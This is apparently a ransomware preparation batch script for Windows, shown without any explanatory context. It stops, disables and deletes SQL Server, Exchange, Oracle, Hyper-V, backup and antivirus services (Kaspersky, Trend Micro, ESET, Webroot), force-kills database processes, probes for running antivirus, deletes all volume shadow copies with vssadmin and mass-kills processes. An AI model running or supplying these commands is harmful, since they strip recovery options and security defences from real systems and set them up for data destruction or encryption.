net stop MSSQLSERVER
sc config MSSQLSERVER start= disabled
net stop "SQL Server (MSSQLSERVER)"
sc config "SQL Server (MSSQLSERVER)" start= disabled
net stop MSSQL$
sc config MSSQL$ start= disabled
net stop SQLSERVERAGENT
sc config SQLSERVERAGENT start= disabled
net stop SQLBrowser
sc config SQLBrowser start= disabled
net stop vss
sc config vss start= disabled
net stop SQLWriter
sc config SQLWriter start= disabled
net stop vmvss
sc config vmvss start= disabled
net stop MSSQL$FE_EXPRESS
sc config MSSQL$FE_EXPRESS start= disabled
net stop MSSQL$RE_EXPRESS
sc config MSSQL$RE_EXPRESS start= disabled
net stop SQLANYs_Sage_FAS_Fixed_Assets 
sc config SQLANYs_Sage_FAS_Fixed_Assets start= disabled
net stop MSSQL$VIM_SQLEXP
sc config MSSQL$VIM_SQLEXP start= disabled
net stop "MSSQLFDLauncher"
net stop "MSSQLSERVER"
net stop "SQLSERVERAGENT"
net stop "SQLBrowser"
net stop "SQLTELEMETRY"
net stop "MsDtsServer130"
net stop "SSISTELEMETRY130"
net stop "SQLWriter"
net stop "MSSQL$VEEAMSQL2012"
net stop "SQLAgent$VEEAMSQL2012"
net stop "MSSQL"
net stop "SQLAgent"
net stop "MSSQLServerADHelper100"
net stop "MSSQLServerOLAPService"
net stop "MsDtsServer100"
net stop "ReportServer"
net stop "SQLTELEMETRY$HL"
net stop "TMBMServer"
net stop "MSSQL$PROGID"
net stop "MSSQL$WOLTERSKLUWER"
net stop "SQLAgent$PROGID"
net stop "SQLAgent$WOLTERSKLUWER"
net stop "MSSQLFDLauncher$OPTIMA"
net stop "MSSQL$OPTIMA"
net stop "SQLAgent$OPTIMA"
net stop "ReportServer$OPTIMA"
net stop "msftesql$SQLEXPRESS"
net stop "postgresql-x64-9.4"
sc config "MSSQLFDLauncher" start= disabled 
sc config "MSSQLSERVER" start= disabled 
sc config "SQLSERVERAGENT" start= disabled 
sc config "SQLBrowser" start= disabled 
sc config "SQLTELEMETRY" start= disabled 
sc config "MsDtsServer130" start= disabled 
sc config "SSISTELEMETRY130" start= disabled 
sc config "SQLWriter" start= disabled 
sc config "MSSQL$VEEAMSQL2012" start= disabled 
sc config "SQLAgent$VEEAMSQL2012" start= disabled 
sc config "MSSQL" start= disabled 
sc config "SQLAgent" start= disabled 
sc config "MSSQLServerADHelper100" start= disabled 
sc config "MSSQLServerOLAPService" start= disabled 
sc config "MsDtsServer100" start= disabled 
sc config "ReportServer" start= disabled 
sc config "SQLTELEMETRY$HL" start= disabled 
sc config "TMBMServer" start= disabled 
sc config "MSSQL$PROGID" start= disabled 
sc config "MSSQL$WOLTERSKLUWER" start= disabled 
sc config "SQLAgent$PROGID" start= disabled 
sc config "SQLAgent$WOLTERSKLUWER" start= disabled 
sc config "MSSQLFDLauncher$OPTIMA" start= disabled 
sc config "MSSQL$OPTIMA" start= disabled 
sc config "SQLAgent$OPTIMA" start= disabled 
sc config "ReportServer$OPTIMA" start= disabled 
sc config "msftesql$SQLEXPRESS" start= disabled 
sc config "postgresql-x64-9.4" start= disabled 
net stop MSDTC
sc config MSDTC start= disabled
net stop vmicvss
sc config vmicvss start= disabled
net stop HostControllerService
sc config HostControllerService start= disabled
net stop MSComplianceAudit
sc config MSComplianceAudit start= disabled
net stop MSExchangeADTopology
sc config MSExchangeADTopology start= disabled
net stop MSExchangeAntispamUpdate
sc config MSExchangeAntispamUpdate start= disabled
net stop MSExchangeCompliance
sc config MSExchangeCompliance start= disabled
net stop MSExchangeDagMgmt
sc config MSExchangeDagMgmt start= disabled
net stop MSExchangeDelivery
sc config MSExchangeDelivery start= disabled
net stop MSExchangeDiagnostics
sc config MSExchangeDiagnostics start= disabled
net stop MSExchangeEdgeSync
sc config MSExchangeEdgeSync start= disabled
net stop MSExchangeFastSearch
sc config MSExchangeFastSearch start= disabled
net stop MSExchangeFrontEndTransport
sc config MSExchangeFrontEndTransport start= disabled
net stop MSExchangeHM
sc config MSExchangeHM start= disabled
net stop MSExchangeHMRecovery
sc config MSExchangeHMRecovery start= disabled
net stop MSExchangeImap4
sc config MSExchangeImap4 start= disabled
net stop MSExchangeIMAP4BE
sc config MSExchangeIMAP4BE start= disabled
net stop MSExchangeIS
sc config MSExchangeIS start= disabled
net stop MSExchangeMailboxAssistants
sc config MSExchangeMailboxAssistants start= disabled
net stop MSExchangeMailboxReplication
sc config MSExchangeMailboxReplication start= disabled
net stop MSExchangeNotificationsBroker
sc config MSExchangeNotificationsBroker start= disabled
net stop MSExchangePop3
sc config MSExchangePop3 start= disabled
net stop MSExchangePOP3BE
sc config MSExchangePOP3BE start= disabled
net stop MSExchangeRepl
sc config MSExchangeRepl start= disabled
net stop MSExchangeRPC
sc config MSExchangeRPC start= disabled
net stop MSExchangeServiceHost
sc config MSExchangeServiceHost start= disabled
net stop MSExchangeSubmission
sc config MSExchangeSubmission start= disabled
net stop MSExchangeThrottling
sc config MSExchangeThrottling start= disabled
net stop MSExchangeTransport
sc config MSExchangeTransport start= disabled
net stop MSExchangeTransportLogSearch
sc config MSExchangeTransportLogSearch start= disabled
net stop MSExchangeUM
sc config MSExchangeUM start= disabled
net stop MSExchangeUMCR
sc config MSExchangeUMCR start= disabled
net stop SearchExchangeTracing
sc config SearchExchangeTracing start= disabled
net stop wsbexchange
sc config wsbexchange start= disabled
net stop IISADMIN
sc config IISADMIN start= disabled
net stop Tomcat8_CLOUDERP
sc config Tomcat8_CLOUDERP start= disabled
net stop Tomcat8_DESARROLLO221
sc config Tomcat8_DESARROLLO221 start= disabled
net stop TeamViewer
sc config TeamViewer start= disabled 
net stop vds
sc config vds start= disabled
net	stop MSSQLServerADHelper
sc config MSSQLServerADHelper start= disabled
net stop Tomcat5
sc config Tomcat5 start= disabled
net stop ibmspsvc
sc stop ibmspsvc start= disabled
net stop IBMHPS
sc stop IBMHPS start= disabled
net stop SDRSVC
sc stop SDRSVC start= disabled
net stop wbengine
sc stop wbengine start= disabled
net stop CASLicenceServer
sc stop CASLicenceServer start= disabled
net stop CASWebServer
sc stop CASWebServer start= disabled
net stop OracleMTSRecoveryService
sc stop OracleMTSRecoveryService start= disabled
net stop WPFFontCache_v0400
sc stop WPFFontCache_v0400 start= disabled
net stop Apache4U8AppServer
sc stop Apache4U8AppServer start= disabled
net stop Apache4TurboCRM70
sc stop Apache4TurboCRM70 start= disabled
net stop UFNet
sc stop UFNet start= disabled
net stop NetTcpPortSharing
sc stop NetTcpPortSharing start= disabled
net stop NetTcpActivator
sc stop NetTcpActivator start= disabled
net stop netprofm
sc stop netprofm start= disabled
net stop NetPipeActivator
sc stop NetPipeActivator start= disabled
net stop NetMsmqActivator
sc stop NetMsmqActivator start= disabled
net stop VMTools
sc stop VMTools start= disabled
net stop AHS Service
sc stop AHS Service start= disabled
net stop MySQL
sc stop MySQL start= disabled
net stop OracleVssWriterORCL
sc stop OracleVssWriterORCL start= disabled
net stop OracleVssWriterBIEE
sc stop OracleVssWriterBIEE start= disabled
net stop MsDtsServer100
sc stop MsDtsServer100 start= disabled
net stop MSSQLFDLauncher
sc stop MSSQLFDLauncher start= disabled
net stop MSSQLServerOLAPService
sc stop MSSQLServerOLAPService start= disabled
net stop ReportServer
sc stop ReportServer strat= disabled
net stop OracleDBConsolebiee
sc stop OracleDBConsolebiee start= disabled
net stop OracleDBConsoleorcl
sc stop OracleDBConsoleorcl start= disabled
net stop OracleMTSRecoveryService
sc stop OracleMTSRecoveryService start= disabled
net stop OracleOraDb11g_home1ClrAgent
sc stop OracleOraDb11g_home1ClrAgent start= disabled
net stop OracleOraDb11g_home1TNSListener
sc stop OracleOraDb11g_home1TNSListener start= disabled
net stop OracleServiceBIEE
sc stop OracleServiceBIEE start= disabled
net stop OracleServiceORCL
sc stop OracleServiceORCL start= disabled
net stop Tomcat7
sc stop Tomcat7 start= disabled
net stop UFNet
sc stop UFNet start= disabled
net stop Apache4TurboCRM70
sc stop Apache4TurboCRM70 start= disabled
net stop MsDtsServer110
sc stop MsDtsServer110 start= disabled
net stop Tomcat8
sc stop Tomcat8 start= disabled
net stop osppsvc
sc stop osppsvc start= disabled
net stop instance2
sc stop instance2 start= disabled
net stop IAStorDataMgrSvc
sc stop IAStorDataMgrSvc start= disabled
net stop AdobeARMservice
sc stop AdobeARMservice start= disabled
net stop FontCache3.0.0.0
sc stop FontCache3.0.0.0 start= disabled
net stop MSSQLLaunchpad$SQLEXPRESS
sc stop MSSQLLaunchpad$SQLEXPRESS start= disabled
nst stop OracleVssWriterORCL
sc stop OracleVssWriterORCL start= disabled
net stop Tomcat6
sc stop Tomcat6 start= disabled
net stop dwmrcs
sc stop dwmrcs start= disabled
net stop SQL Server Analysis Services CEIP (MSSQLSERVER)
sc stop SQL Server Analysis Services CEIP (MSSQLSERVER) start= disabled





taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe 
taskkill -f -im	SMSvcHost.exe


@echo off
rem Delite Service "Hyper-V"
sc delete "vmickvpexchange"
sc delete "vmicguestinterface"
sc delete "vmicshutdown"
sc delete "vmicheartbeat"
sc delete "vmicrdv"
sc delete "storflt"
sc delete "vmictimesync"
sc delete "vmicvss"

rem Delite Service "SQL"
sc delete "MSSQLFDLauncher"
sc delete "MSSQLSERVER"
sc delete "SQLSERVERAGENT"
sc delete "SQLBrowser"
sc delete "SQLTELEMETRY"
sc delete "MsDtsServer130"
sc delete "SSISTELEMETRY130"
sc delete "SQLWriter"
sc delete "MSSQL$VEEAMSQL2012"
sc delete "SQLAgent$VEEAMSQL2012"
sc delete "MSSQL"
sc delete "SQLAgent"
sc delete "MSSQLServerADHelper100"
sc delete "MSSQLServerOLAPService"
sc delete "MsDtsServer100"
sc delete "ReportServer"
sc delete "SQLTELEMETRY$HL"
sc delete "TMBMServer"
sc delete "MSSQL$PROGID"
sc delete "MSSQL$WOLTERSKLUWER"
sc delete "SQLAgent$PROGID"
sc delete "SQLAgent$WOLTERSKLUWER"
sc delete "MSSQLFDLauncher$OPTIMA"
sc delete "MSSQL$OPTIMA"
sc delete "SQLAgent$OPTIMA"
sc delete "ReportServer$OPTIMA"
sc delete "msftesql$SQLEXPRESS"
sc delete "postgresql-x64-9.4"


rem Delite Service "AV: Webroot"
sc delete "WRSVC"

rem Delite Service "AV: ESET"
sc delete "ekrn"

rem Delite Service "AV: Kaspersky"
sc delete "klim6"
sc delete "AVP18.0.0"
sc delete "KLIF"
sc delete "klpd"
sc delete "klflt"
sc delete "klbackupdisk"
sc delete "klbackupflt"
sc delete "klkbdflt"
sc delete "klmouflt"
sc delete "klhk"
sc delete "KSDE1.0.0"
sc delete "kltap"

rem Delite Service "AV: Trend Micro"
sc delete "TmFilter"
sc delete "TMLWCSService"
sc delete "tmusa"
sc delete "TmPreFilter"
sc delete "TMSmartRelayService"
sc delete "TMiCRCScanService"
sc delete "VSApiNt"
sc delete "TmCCSF"
sc delete "tmlisten"
sc delete "TmProxy"
sc delete "ntrtscan"
sc delete "ofcservice"

rem Kill
sc delete "UniFi"


rem Kill "SQL"
taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe


rem Kill
taskkill -f -im UniFi.exe


Echo TIME TO FIND AV

tasklist /fi "imagename eq MsMpEng.exe" | find /c "PID" && Echo Windows Defender
tasklist /fi "imagename eq ntrtscan.exe" | find /c "PID" && Echo Trend Micro Security
tasklist /fi "imagename eq avp.exe" | find /c "PID" && Echo Kaspersky Endpoint Security
tasklist /fi "imagename eq WRSA.exe" | find /c "PID" && Echo Webroot
tasklist /fi "imagename eq egui.exe" | find /c "PID" && Echo ESET
tasklist /fi "imagename eq AvastUI.exe" | find /c "PID" && Echo Avast

Echo TIME TO KILL ALL

vssadmin.exe Delete Shadows /All /Quiet

TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"
taskkill -f -im IAStorIcon.exe